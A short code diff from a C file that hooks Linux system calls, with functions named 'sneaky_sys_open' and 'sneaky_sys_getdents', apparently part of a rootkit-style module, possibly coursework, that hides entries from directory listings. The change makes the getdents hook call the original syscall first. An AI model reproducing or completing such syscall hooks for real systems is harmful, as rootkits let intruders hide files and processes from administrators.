@@ -81,7 +81,7 @@ asmlinkage int sneaky_sys_open(const char *pathname, int flags)
 
 asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count){
 
-    int num = dirp->d_reclen;
+    int num = original_getdents(fd, dirp, count);
     struct linux_dirent * current_dir;
     int current_position = 0;
     int current_reclen,  length;
